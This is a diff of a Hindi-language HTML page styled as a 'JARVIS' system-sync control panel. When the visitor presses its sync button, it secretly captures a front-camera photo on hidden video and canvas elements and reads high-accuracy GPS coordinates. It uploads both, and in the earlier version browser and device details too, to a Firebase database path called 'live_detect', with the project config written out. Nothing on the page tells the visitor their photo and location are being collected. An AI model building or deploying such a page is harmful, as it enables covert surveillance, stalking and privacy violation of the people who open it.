@@ -3,33 +3,25 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS - COMPREHENSIVE SYNC</title>
+    <title>JARVIS REMOTE - COMPRESSED</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         body { background: #000; color: #00f2ff; font-family: 'Segoe UI', sans-serif; text-align: center; padding: 20px; margin: 0; }
         .control-box { border: 2px solid #00f2ff; background: #0a0a0a; padding: 25px; display: inline-block; border-radius: 10px; max-width: 400px; width: 100%; box-shadow: 0 0 15px rgba(0, 242, 255, 0.3); margin-top: 20px; }
         .btn { background: #00f2ff; color: #000; border: none; padding: 15px 20px; font-weight: bold; font-size: 16px; border-radius: 5px; cursor: pointer; text-transform: uppercase; margin-top: 15px; width: 100%; display: block; box-shadow: 0 0 10px #00f2ff; }
-        .btn:active { background: #00a8ff; transform: scale(0.98); }
-        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; line-height: 1.5; }
-        #v { width: 100%; height: auto; display: none; }
-        canvas { display: none; }
+        .status-text { margin-top: 15px; font-size: 14px; color: #fff; text-align: left; background: rgba(255,255,255,0.05); padding: 10px; border-radius: 4px; border-left: 3px solid #39ff14; }
+        #v { display: none; } canvas { display: none; }
     </style>
 </head>
 <body>
-
     <div class="control-box">
-        <h2>JARVIS CORE v3</h2>
-        <p style="color: #888; font-size: 13px;">लोकेशन, फोटो एवं डिवाइस सिंक</p>
-        
+        <h2>JARVIS SYSTEM v4</h2>
+        <p style="color: #888;">लोकेशन और कंप्रेस्ड फोटो लिंक</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
-
-        <button class="btn" onclick="syncAllDeviceData()">🚀 फुल सिस्टम सिंक करें</button>
-        
-        <div class="status-text" id="log-status">
-            <b>सिस्टम स्थिति:</b> रेडी (डेटा भेजने के लिए बटन दबाएं)
-        </div>
+        <button class="btn" onclick="syncData()">🚀 फुल सिस्टम सिंक</button>
+        <div class="status-text" id="log-status">रेडी...</div>
     </div>
 
     <script>
@@ -38,83 +30,37 @@
           authDomain: "army-cb492.firebaseapp.com",
           databaseURL: "https://army-cb492-default-rtdb.firebaseio.com",
           projectId: "army-cb492",
-          storageBucket: "army-cb492.firebasestorage.app",
-          messagingSenderId: "449848409517",
-          appId: "1:449848409517:web:386ad1b570731b6ec4f524",
-          measurementId: "G-NVG20J32ZP"
+          appId: "1:449848409517:web:386ad1b570731b6ec4f524"
         };
-
         if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        async function syncAllDeviceData() {
-            const statusDiv = document.getElementById('log-status');
-            statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> डेटा कलेक्ट किया जा रहा है...";
-
-            // 1. डिवाइस इन्फो निकालना (Browser UserAgent और स्क्रीन साइज)
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                time: new Date().toLocaleString()
-            };
-            
-            // डेटाबेेस में डिवाइस इन्फो अपडेट करना
-            database.ref('live_detect/device_details').set(deviceInfo);
-
+        async function syncData() {
+            document.getElementById('log-status').innerHTML = "कनेक्ट किया जा रहा है...";
             try {
-                // 2. कैमरा एक्सेस ऑन करना
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
+                document.getElementById('v').srcObject = stream;
 
-                video.onloadedmetadata = () => {
-                    statusDiv.innerHTML = "<b>सिस्टम स्थिति:</b> फोटो और लोकेशन सिंक जारी...";
-                    captureAndSyncPhoto(stream, statusDiv);
-                };
-
-                // 3. जीपीएस लोकेशन निकालना
-                navigator.geolocation.getCurrentPosition((position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
                     database.ref('live_detect/location').set({ lat: lat, lon: lon });
-                    statusDiv.innerHTML += `<br>📍 GPS लॉक: ${lat.toFixed(5)}, ${lon.toFixed(5)}`;
-                }, (err) => {
-                    statusDiv.innerHTML += "<br>❌ GPS एरर: लोकेशन अनुमति आवश्यक है।";
-                }, { enableHighAccuracy: true });
-
-            } catch (err) {
-                statusDiv.innerHTML = "❌ एरर: कृपया कैमरा/लोकेशन की अनुमति ब्राउज़र में 'Allow' करें।";
-                console.error(err);
-            }
-        }
-
-        function captureAndSyncPhoto(stream, statusDiv) {
-            const v = document.getElementById('v');
-            const c = document.getElementById('c');
-            
-            setTimeout(() => {
-                c.width = 320; 
-                c.height = 240;
-                c.getContext('2d').drawImage(v, 0, 0, 320, 240);
-                
-                // इमेज को बेस64 टेक्स्ट में कनवर्ट करना
-                const base64Photo = c.toDataURL('image/jpeg', 0.6);
-                
-                statusDiv.innerHTML += "<br>📤 फोटो डेटाबेस में भेजी जा रही है...";
-                
-                // रियल-टाइम डेटाबेस में फोटो सेव करना
-                database.ref('live_detect').update({ photo: base64Photo })
-                .then(() => {
-                    statusDiv.innerHTML += "<br>✅ [SUCCESS] फोटो, लोकेशन और डिवाइस सिंक पूर्ण!";
                     
-                    // काम पूरा होने पर कैमरा बंद करना
-                    stream.getTracks().forEach(track => track.stop());
-                })
-                .catch(e => {
-                    statusDiv.innerHTML += "<br>❌ डेटाबेस एरर: रूल्स चेक करें।";
-                });
-            }, 1000); // 1 सेकंड का डिले कैमरा स्थिर करने के लिए
+                    // फोटो कैप्चर लॉजिक
+                    setTimeout(() => {
+                        const v = document.getElementById('v');
+                        const c = document.getElementById('c');
+                        c.width = 240; // साइज एकदम छोटा किया ताकि डेटाबेस हैंग न हो
+                        c.height = 180;
+                        c.getContext('2d').drawImage(v, 0, 0, 240, 180);
+                        const smallPhoto = c.toDataURL('image/jpeg', 0.4); // सुपर कंप्रेस्ड
+                        
+                        database.ref('live_detect').update({ photo: smallPhoto });
+                        document.getElementById('log-status').innerHTML = "✅ मैप और फोटो सिंक हो गए!";
+                        stream.getTracks().forEach(t => t.stop());
+                    }, 1000);
+                }, err => { alert("लोकेशन परमिशन चालू करें बॉस!"); });
+            } catch(e) { alert("कैमरा परमिशन दें बॉस!"); }
         }
     </script>
 </body>
